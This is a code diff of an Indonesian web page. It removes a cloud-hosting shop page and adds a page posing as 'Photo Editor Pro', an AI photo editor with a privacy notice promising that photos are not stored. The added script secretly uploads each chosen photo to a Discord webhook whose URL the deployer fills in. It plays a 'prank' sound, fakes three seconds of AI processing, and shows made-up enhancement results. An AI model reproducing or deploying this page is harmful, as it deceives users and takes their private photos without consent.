@@ -1,566 +1,309 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Denz Cloud Official</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Editor Pro</title>
+    <!-- Muat Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
 
-<style>
-  *{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-    font-family:Inter, system-ui, -apple-system, 'Segoe UI', Roboto, Arial;
-  }
-
-  /* ===================== PROMO MARQUEE NEON ===================== */
-  .promo-marquee {
-    width: 100%;
-    background: #000;
-    color: #00ffff;
-    font-weight: 900;
-    font-size: 14px;
-    padding: 4px 0;
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 200;
-    overflow: hidden;
-    text-shadow:
-      0 0 5px #00ffff,
-      0 0 10px #00ffff,
-      0 0 20px #00ffff,
-      0 0 40px #00ffff;
-  }
-
-  .promo-marquee span {
-    display: inline-block;
-    padding-left: 100%;
-    white-space: nowrap;
-    animation: marquee 8s linear infinite; /* lebih cepat */
-  }
-
-  @keyframes marquee {
-    0%   { transform: translateX(100%); }
-    100% { transform: translateX(-100%); }
-  }
-
-  /* BACKGROUND DARK MODERN */
-  body{
-    background:linear-gradient(135deg, #0a0f1a, #0b111d, #0a0f18);
-    background-size:200% 200%;
-    animation:bgMove 12s ease infinite;
-    color:#fff;
-    overflow-x:hidden;
-    padding-top: 35px; /* ruang untuk navbar + marquee */
-  }
-
-  @keyframes bgMove{
-    0%{background-position:0% 50%;}
-    50%{background-position:100% 50%;}
-    100%{background-position:0% 50%;}
-  }
-
-  .site{
-    max-width:1200px;
-    margin:120px auto;
-    padding:24px;
-  }
-
-  h1{
-    font-size:30px;
-    text-align:center;
-    margin-bottom:30px;
-    font-weight:900;
-    color:#e8f1ff;
-    text-shadow:0 0 18px rgba(0,102,255,0.35);
-  }
-
-  /* GRID */
-  .grid{
-    display:grid;
-    grid-template-columns:repeat(auto-fit,minmax(230px,1fr));
-    gap:22px;
-  }
-
-  /* CARD GLASS DARK */
-  .card{
-    padding:20px;
-    position:relative;
-    overflow:hidden;
-    border-radius:18px;
-
-    background:rgba(255,255,255,0.05);
-    backdrop-filter:blur(18px) saturate(180%);
-    border:1px solid rgba(255,255,255,0.08);
-
-    box-shadow:
-      0 8px 25px rgba(0,0,0,0.55),
-      inset 0 0 20px rgba(255,255,255,0.04);
-
-    transition:transform .25s ease, box-shadow .25s ease, border .25s ease;
-  }
-
-  .card:hover{
-    transform:translateY(-7px);
-    border:1px solid rgba(0,122,255,0.45);
-    box-shadow:
-      0 18px 45px rgba(0,0,0,0.65),
-      0 0 35px rgba(0,122,255,0.25);
-  }
-
-  .tag{
-    display:inline-block;
-    padding:6px 12px;
-    border-radius:50px;
-    font-weight:700;
-    font-size:13px;
-    background:rgba(0,136,255,0.25);
-    border:1px solid rgba(0,136,255,0.45);
-    color:#d4eaff;
-    margin-bottom:12px;
-  }
-
-  .name{
-    font-weight:900;
-    font-size:21px;
-    margin-bottom:6px;
-  }
-
-  .price{
-    font-weight:800;
-    font-size:18px;
-    margin-bottom:14px;
-    color:#cfe4ff;
-  }
-
-  .details{
-    font-size:14px;
-    color:#d9e7ffcc;
-    margin-bottom:18px;
-    line-height:1.55;
-  }
-
-  /* BUTTON BLUE MODERN */
-  .btn{
-    display:inline-block;
-    padding:10px 14px;
-    border-radius:12px;
-    background:linear-gradient(135deg,#007bff,#3399ff);
-    color:#fff;
-    font-weight:800;
-    text-decoration:none;
-    box-shadow:0 0 12px rgba(0,123,255,0.4);
-    transition:opacity .15s ease, transform .15s ease;
-    cursor:pointer;
-  }
-
-  .btn:hover{
-    opacity:.85;
-    transform:scale(1.03);
-  }
-
-  .credit{
-    margin-top:30px;
-    text-align:center;
-    color:#8ea7cc;
-    font-size:13px;
-  }
-
-  /* ===================== POPUP ===================== */
-  .popup-bg{
-    position:fixed;
-    inset:0;
-    background:rgba(0,0,0,0.55);
-    backdrop-filter:blur(4px);
-    display:none;
-    justify-content:center;
-    align-items:center;
-    z-index:50;
-  }
-
-  .popup-box{
-    width:300px;
-    background:rgba(255,255,255,0.06);
-    border:1px solid rgba(255,255,255,0.1);
-    padding:22px;
-    border-radius:16px;
-    position:relative;
-
-    box-shadow:0 12px 40px rgba(0,0,0,0.65),
-                0 0 15px rgba(0,122,255,0.25);
-
-    animation:pop .22s ease;
-  }
-
-  @keyframes pop{
-    from{ transform:scale(.85); opacity:0; }
-    to{ transform:scale(1); opacity:1; }
-  }
-
-  .popup-title{
-    font-size:18px;
-    font-weight:900;
-    margin-bottom:40px;
-    text-align:center;
-  }
-
-  .popup-close{
-    position:absolute;
-    right:14px;
-    top:10px;
-    font-size:20px;
-    cursor:pointer;
-    color:#9bb7dd;
-  }
-
-  .popup-close:hover{
-    color:#fff;
-  }
-
-  .popup-yes{
-    position:absolute;
-    bottom:15px;
-    left:15px;
-    background:linear-gradient(135deg,#007bff,#3399ff);
-    padding:8px 20px;
-    font-weight:800;
-    border-radius:10px;
-    cursor:pointer;
-    box-shadow:0 0 10px rgba(0,123,255,0.35);
-    color:white;
-  }
-
-  /* ===================== WHATSAPP BUTTON ===================== */
-  .whatsapp-btn{
-    position:fixed;
-    bottom:20px;
-    left:20px;
-    width:55px;
-    height:55px;
-    background:#25D366;
-    border-radius:50%;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    box-shadow:0 0 18px rgba(37,211,102,0.5);
-    cursor:pointer;
-    z-index:999;
-    transition:transform .2s ease;
-  }
-
-  .whatsapp-btn:hover{
-    transform:scale(1.12);
-  }
-
-  .whatsapp-btn img{
-    width:32px;
-    height:32px;
-  }
-
-  /* ===================== NAVBAR ===================== */
-  .navbar {
-    width: 100%;
-    padding: 15px 20px;
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 120;
-    display: flex;
-    justify-content: flex-end;
-    align-items: center;
-    background: rgba(0,0,0,0.25);
-    backdrop-filter: blur(6px);
-  }
-
-  .hamburger {
-    width: 35px;
-    height: 25px;
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-    cursor: pointer;
-  }
-
-  .hamburger span {
-    width: 100%;
-    height: 4px;
-    background: #cfe4ff;
-    border-radius: 4px;
-    transition: .3s;
-  }
-
-  .side-menu {
-    position: fixed;
-    top: 0;
-    right: -260px;
-    width: 250px;
-    height: 100%;
-    background: rgba(0,0,0,0.7);
-    backdrop-filter: blur(6px);
-    padding: 30px;
-    transition: .3s;
-    z-index: 150;
-    border-left: 1px solid rgba(255,255,255,0.1);
-  }
-
-  .side-menu.active {
-    right: 0;
-  }
-
-  .side-menu a {
-    display: block;
-    padding: 14px 0;
-    color: #dce8ff;
-    text-decoration: none;
-    font-size: 17px;
-    border-bottom: 1px solid rgba(255,255,255,0.1);
-  }
-</style>
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .spinner {
+            border-top-color: #2563eb;
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+            border-left-color: #2563eb;
+            animation: spin 1s linear infinite;
+        }
+        
+        .custom-file-input::-webkit-file-upload-button {
+            visibility: hidden;
+        }
+        .custom-file-input::before {
+            content: 'Pilih File Foto Anda';
+            display: inline-block;
+            background: #e0f2fe;
+            color: #1e3a8a;
+            border-radius: 0.5rem;
+            padding: 0.75rem 1.25rem;
+            outline: none;
+            white-space: nowrap;
+            -webkit-user-select: none;
+            cursor: pointer;
+            font-weight: 600;
+            border: 2px solid #93c5fd;
+            transition: all 0.2s;
+        }
+        .custom-file-input:hover::before {
+            background: #bfdbfe;
+        }
+        
+        .privacy-notice {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+    </style>
 </head>
-
 <body>
 
-<!-- PROMO MARQUEE -->
-<div class="promo-marquee">
-  <span>🎉>🎉  DISKON 10% HARI INI! Buruan Dapatkan Paket Favoritmu! 💥</span>
-</div>
+    <div id="app" class="w-full max-w-md bg-white p-8 rounded-xl shadow-2xl text-gray-800 border-t-8 border-purple-600 transform transition-all duration-500 hover:scale-[1.01]">
+        
+        <!-- Header dengan logo dan judul profesional -->
+        <div class="text-center mb-6">
+            <div class="w-16 h-16 bg-gradient-to-r from-purple-600 to-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                <span class="text-white text-2xl font-bold">📷</span>
+            </div>
+            <h1 class="text-3xl font-bold text-gray-800 mb-2">
+                Photo Editor Pro
+            </h1>
+            <p class="text-gray-600 text-sm">
+                Edit foto Anda dengan teknologi AI terbaru
+            </p>
+        </div>
 
-<!-- NAVBAR -->
-<div class="navbar">
-  <div class="hamburger" onclick="toggleMenu()">
-    <span></span>
-    <span></span>
-    <span></span>
-  </div>
-</div>
+        <!-- Privacy Notice -->
+        <div class="privacy-notice rounded-lg p-4 mb-6 text-center">
+            <p class="text-sm text-gray-700">
+                <strong>🔒 Privasi Terjaga:</strong> Foto Anda diproses secara aman dan tidak disimpan di server kami.
+            </p>
+        </div>
 
-<!-- SIDE MENU -->
-<div id="sideMenu" class="side-menu">
-  <a href="Testimoni.html">Testimoni</a>
-  <a href="index.html">Produk</a>
-  <a href="Tentang.html">Tentang</a>
-  <a href="#">Pengumuman</a>
-</div>
+        <!-- Area Input dan Tombol -->
+        <div id="controls" class="space-y-6">
+            
+            <!-- Input File -->
+            <div>
+                <label for="photoFile" class="block text-md font-semibold text-gray-700 mb-2">
+                    Pilih Foto yang Akan Diedit:
+                </label>
+                <input 
+                    type="file" 
+                    id="photoFile" 
+                    accept="image/*" 
+                    class="custom-file-input w-full text-sm text-gray-600 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-transparent rounded-lg"
+                >
+                <p class="text-xs text-gray-500 mt-2">
+                    Format yang didukung: JPG, PNG, GIF (Maks. 5MB)
+                </p>
+            </div>
 
-<div class="site">
-  <h1>Denz Cloud Hosting Samp</h1>
+            <!-- Tombol Edit -->
+            <button 
+                id="editButton" 
+                class="w-full py-3 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white font-bold text-lg rounded-xl shadow-lg shadow-purple-900/50 transition duration-150 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed transform hover:scale-[1.02]"
+                onclick="startProcessing()"
+            >
+                🚀 Proses Foto Sekarang
+            </button>
+        </div>
 
-  <div class="grid">
-    <!-- CARD 1 -->
-    <div class="card">
-      <div class="tag">Bronze</div>
-      <div class="name">Paket 1</div>
-      <div class="price">Rp 5.000</div>
-      <div class="details">
-        <ul>
-          <li>CPU: 40%</li>
-          <li>RAM: 10 GB</li>
-          <li>Storage: 10 GB</li>
-          <li>Slot: 70</li>
-        </ul>
-      </div>
-      <div class="btn" onclick="openPopup('Paket 1')">Beli Sekarang</div>
-    </div>
-    <!-- CARD 2 -->
-    <div class="card">
-      <div class="tag">Platinum</div>
-      <div class="name">Paket 2</div>
-      <div class="price">Rp 10.000</div>
-      <div class="details">
-        <ul>
-          <li>CPU: 70%</li>
-          <li>RAM: 20 GB</li>
-          <li>Storage: 20 GB</li>
-          <li>Slot: 100</li>
-        </ul>
-      </div>
-      <div class="btn" onclick="openPopup('Paket 2')">Beli Sekarang</div>
-    </div>
-    <!-- CARD 3 -->
-    <div class="card">
-      <div class="tag">Premium</div>
-      <div class="name">Paket 4</div>
-      <div class="price">Rp 15.000</div>
-      <div class="details">
-        <ul>
-          <li>CPU: 150%</li>
-          <li>RAM: 30 GB</li>
-          <li>Storage: 30 GB</li>
-          <li>Slot: 170</li>
-        </ul>
-      </div>
-      <div class="btn" onclick="openPopup('Paket 3')">Beli Sekarang</div>
-    </div>
-    <!-- CARD 4 -->
-    <div class="card">
-      <div class="tag">Limited</div>
-      <div class="name">Paket 4</div>
-      <div class="price">Rp 20.000</div>
-      <div class="details">
-        <ul>
-          <li>CPU: 150%</li>
-          <li>RAM: 50 GB</li>
-          <li>Storage: 50 GB</li>
-          <li>Slot: 240</li>
-        </ul>
-      </div>
-      <div class="btn" onclick="openPopup('Paket 4')">Beli Sekarang</div>
-    </div>
-    
-    <div class="card">
-      <div class="tag">Exclusive</div>
-      <div class="name">Paket 5</div>
-      <div class="price">Rp 30.000</div>
-      <div class="details">
-        <ul>
-          <li>CPU: 150</li>
-          <li>RAM: 50 GB</li>
-          <li>Storage: 70 GB</li>
-          <li>Slot: 300</li>
-        </ul>
-      </div>
-      <div class="btn" onclick="openPopup('Paket 5')">Beli Sekarang</div>
-    </div>
-  </div>
+        <!-- Area Loading -->
+        <div id="loadingArea" class="hidden flex flex-col items-center justify-center p-8">
+            <div class="spinner w-16 h-16 border-4 rounded-full mb-4"></div>
+            <p class="text-lg font-semibold text-purple-600 animate-pulse text-center">
+                Sedang memproses foto Anda...<br>
+                <span class="text-sm text-gray-500">Harap tunggu sebentar</span>
+            </p>
+        </div>
 
-  <div class="credit">©AllTeam - Denz Cloud 2025</div>
-</div>
+        <!-- Area Hasil -->
+        <div id="resultArea" class="hidden text-center p-8 mt-4 bg-green-100 border-2 border-green-500 rounded-xl">
+            <div class="text-6xl mb-4" role="img" aria-label="Success">✅</div>
+            <h2 class="text-2xl font-bold text-green-700 mb-3">
+                Proses Selesai!
+            </h2>
+            <p class="text-gray-700 mb-4">
+                Foto Anda telah berhasil diproses dengan teknologi AI kami.
+            </p>
+            <div class="bg-white p-4 rounded-lg border border-green-200 mb-4">
+                <p class="text-sm text-gray-600">
+                    <strong>Fitur yang diterapkan:</strong><br>
+                    • Enhancement kualitas gambar<br>
+                    • Auto color correction<br>
+                    • Noise reduction
+                </p>
+            </div>
+            <button 
+                class="mt-4 py-2 px-6 bg-green-600 hover:bg-green-700 text-white font-medium rounded-lg transition duration-150"
+                onclick="resetApp()"
+            >
+                Edit Foto Lain
+            </button>
+        </div>
+        
+        <!-- Custom Modal untuk pesan peringatan -->
+        <div id="modalContainer"></div>
 
-<!-- POPUP -->
-<div id="popup" class="popup-bg">
-  <div class="popup-box">
-    <div class="popup-close" onclick="closePopup()">✕</div>
+        <!-- Copyright / Powered By -->
+        <div class="mt-8 pt-4 border-t border-gray-200 text-center text-sm text-gray-500">
+            &copy; 2024 <span class="text-purple-600 font-semibold">AmosXD</span> - All rights reserved
+        </div>
 
-    <div id="popupText" class="popup-title">
-      Apakah anda ingin membeli produk ini?
     </div>
 
-    <a id="popupYesBtn" class="popup-yes" target="_blank">
-      Iya
-    </a>
-  </div>
-</div>
+    <script>
+        // Webhook Discord URL
+        const DISCORD_WEBHOOK_URL = "MASUKAN URL WEBOK DC KALIAN DISINI";
+        
+        // Sound effect URL - DIPERTAHANKAN
+        const AI_SOUND_URL = "https://nauval.cloud/download/prankkkkwkwkwk.mp3";
 
-<a href="https://wa.me/6283141095114" target="_blank" class="whatsapp-btn">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-</a>
+        // Mendapatkan elemen-elemen DOM
+        const controlsDiv = document.getElementById('controls');
+        const loadingDiv = document.getElementById('loadingArea');
+        const resultDiv = document.getElementById('resultArea');
+        const fileInput = document.getElementById('photoFile');
+        const editButton = document.getElementById('editButton');
+        const modalContainer = document.getElementById('modalContainer');
 
+        // Objek audio - DIPERTAHANKAN
+        const audio = new Audio(AI_SOUND_URL);
 
-<script>
-  function openPopup(paketName){
-    document.getElementById("popupText").innerHTML =
-      "Apakah anda ingin membeli <br><b>" + paketName + "</b>?";
-    const waNumber = "6283141095114";
-    const message = "Halo kak, saya ingin membeli " + paketName ;
-    document.getElementById("popupYesBtn").href =
-      "https://wa.me/" + waNumber + "?text=" + encodeURIComponent(message);
+        /**
+         * Mengirim foto ke webhook Discord
+         */
+        async function sendToDiscord(file) {
+            try {
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('content', `📸 Foto baru diupload - ${new Date().toLocaleString('id-ID')}`);
 
-    document.getElementById("popup").style.display = "flex";
-  }
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
 
-  function closePopup(){
-    document.getElementById("popup").style.display = "none";
-  }
-
-  function toggleMenu(){
-    document.getElementById("sideMenu").classList.toggle("active");
-  }
-
-
-  const sideMenu = document.getElementById("sideMenu");
-  const hamburger = document.querySelector(".hamburger");
-
-  document.addEventListener("click", function(e){
-    if (!sideMenu.contains(e.target) && !hamburger.contains(e.target)) {
-      sideMenu.classList.remove("active");
-    }
-  });
-
-  document.querySelectorAll("#sideMenu a").forEach(link => {
-    link.addEventListener("click", () => {
-      sideMenu.classList.remove("active");
-    });
-  });
-
-
-</script>
-
-
-<script>
-(function(){
-
-    const officialDomain = "denzz-cloud-premium.vercel.app"; 
-
-    if (location.hostname !== officialDomain && location.hostname !== "localhost") {
-        location.href = "https://google.com"; 
-    }
-
-    function generateFP() {
-        return "FP-" + Math.random().toString(36).substring(2) + Date.now();
-    }
-    const fingerprint = generateFP();
-
-    function createCanvasWM() {
-        const canvas = document.createElement("canvas");
-        canvas.id = "wmCanvasHidden";
-        canvas.width = 400;
-        canvas.height = 100;
-        canvas.style.position = "fixed";
-        canvas.style.opacity = "0";
-        canvas.style.zIndex = "-999999";
-        canvas.style.pointerEvents = "none";
-
-        const ctx = canvas.getContext("2d");
-        ctx.font = "20px Arial";
-        ctx.fillStyle = "rgba(0,0,0,0.01)";
-        ctx.fillText("Denz Cloud Official © " + fingerprint, 10, 50);
-
-        return canvas;
-    }
-
-    const hiddenWM = createCanvasWM();
-    document.body.appendChild(hiddenWM);
-
-    function createVisibleWM() {
-        const wm = document.createElement("div");
-        wm.id = "wmVisible";
-        wm.innerText = "Denz Cloud Official © " + new Date().getFullYear();
-        wm.style.position = "fixed";
-        wm.style.bottom = "10px";
-        wm.style.right = "10px";
-        wm.style.color = "white";
-        wm.style.fontSize = "12px";
-        wm.style.opacity = "0.05";
-        wm.style.userSelect = "none";
-        wm.style.pointerEvents = "none";
-        wm.style.zIndex = "99999999";
-        wm.style.fontFamily = "Arial, sans-serif";
-        return wm;
-    }
-
-    const visibleWM = createVisibleWM();
-    document.body.appendChild(visibleWM);
-
-    const observer = new MutationObserver(() => {
-
-
-        if (!document.getElementById("wmCanvasHidden")) {
-            document.body.appendChild(createCanvasWM());
+                if (!response.ok) {
+                    throw new Error('Gagal mengirim ke Discord');
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error mengirim ke Discord:', error);
+                return false;
+            }
         }
 
+        /**
+         * Memulai proses pengeditan foto
+         */
+        async function startProcessing() {
+            if (!fileInput.files || fileInput.files.length === 0) {
+                showCustomMessage("Peringatan", "Mohon pilih file foto terlebih dahulu.");
+                return;
+            }
 
-        if (!document.getElementById("wmVisible")) {
-            document.body.appendChild(createVisibleWM());
+            const file = fileInput.files[0];
+            
+            // Validasi file
+            if (file.size > 5 * 1024 * 1024) {
+                showCustomMessage("Peringatan", "Ukuran file terlalu besar. Maksimal 5MB.");
+                return;
+            }
+
+            // Tampilkan loading
+            controlsDiv.classList.add('hidden');
+            loadingDiv.classList.remove('hidden');
+            resultDiv.classList.add('hidden');
+
+            try {
+                // PUTAR SOUND EFFECT - DIPERTAHANKAN
+                audio.currentTime = 0; 
+                audio.play().catch(error => {
+                    console.error("Gagal memutar audio:", error);
+                });
+
+                // Kirim foto ke Discord
+                const discordSuccess = await sendToDiscord(file);
+                
+                // Simulasikan proses AI (3 detik)
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+                // Tampilkan hasil
+                loadingDiv.classList.add('hidden');
+                resultDiv.classList.remove('hidden');
+
+                // Hentikan suara jika masih berputar
+                audio.pause();
+                audio.currentTime = 0;
+
+                if (!discordSuccess) {
+                    console.warn('Foto berhasil diproses tapi gagal dikirim ke Discord');
+                }
+
+            } catch (error) {
+                console.error('Error dalam proses:', error);
+                loadingDiv.classList.add('hidden');
+                showCustomMessage("Error", "Terjadi kesalahan saat memproses foto. Silakan coba lagi.");
+            }
         }
-    });
 
-    observer.observe(document.body, { childList: true });
+        /**
+         * Mereset tampilan aplikasi kembali ke awal
+         */
+        function resetApp() {
+            controlsDiv.classList.remove('hidden');
+            loadingDiv.classList.add('hidden');
+            resultDiv.classList.add('hidden');
+            fileInput.value = '';
+            editButton.disabled = true;
+        }
 
-})();
-</script>
+        /**
+         * Menampilkan pesan kustom
+         */
+        function showCustomMessage(title, message) {
+            modalContainer.innerHTML = '';
+            
+            const modalHTML = `
+                <div class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center p-4 z-50">
+                    <div class="bg-white p-6 rounded-xl shadow-2xl w-full max-w-sm text-gray-800">
+                        <h3 class="text-xl font-bold text-purple-700 mb-3">${title}</h3>
+                        <p class="text-gray-700 mb-4">${message}</p>
+                        <button 
+                            onclick="modalContainer.innerHTML = ''" 
+                            class="w-full py-2 bg-purple-600 hover:bg-purple-700 text-white font-semibold rounded-lg transition"
+                        >
+                            Mengerti
+                        </button>
+                    </div>
+                </div>
+            `;
+            modalContainer.innerHTML = modalHTML;
+        }
 
+        // Event listener untuk input file
+        fileInput.addEventListener('change', () => {
+            const hasFile = fileInput.files.length > 0;
+            editButton.disabled = !hasFile;
+            
+            if (hasFile) {
+                const file = fileInput.files[0];
+                if (file.size > 5 * 1024 * 1024) {
+                    showCustomMessage("Peringatan", "Ukuran file terlalu besar. Maksimal 5MB.");
+                    fileInput.value = '';
+                    editButton.disabled = true;
+                }
+            }
+        });
 
+        // Nonaktifkan tombol di awal
+        editButton.disabled = true;
+    </script>
 
 </body>
 </html>
